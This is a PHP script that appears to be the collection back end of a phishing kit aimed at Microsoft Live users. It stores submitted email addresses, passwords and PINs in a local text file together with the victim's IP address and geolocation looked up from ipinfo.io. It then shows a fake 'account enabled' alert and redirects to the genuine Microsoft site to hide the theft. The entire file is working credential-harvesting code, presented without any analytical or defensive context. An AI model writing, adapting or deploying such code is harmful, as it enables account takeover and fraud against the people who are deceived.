<?php



date_default_timezone_set('America/Caracas');

ini_set("display_errors", 0);

$userp = $_SERVER['REMOTE_ADDR'];



$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));

$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));

$postal = trim(file_get_contents("http://ipinfo.io/{$userp}/postal"));

$region = trim(file_get_contents("http://ipinfo.io/{$userp}/region"));

	

	$file = fopen("dhysistext.txt", "a");

	

fwrite($file, "Correo: ".$_POST['eemmll']."\nPsswrd: ".$_POST['ccllvv']."\nPin: ".$_POST['ppnn']."\nFecha: ".date('Y-m-d')." - ".date('H:i:s')."\nIP:".$userp." ".$cc."\nCiudad: ".$city."\nEstado: ".$region."\nCodigo Postal: ".$postal." " . PHP_EOL);

fwrite($file, "----------------------------------------- " . PHP_EOL);

fclose($file);



	 echo "<script>";

			echo "alert('Su cuenta ha sido habilitada exitosamente!');";

			echo "window.location.href='https://home.live.com/?mkt=es-es';";

			echo "</script>";



?> 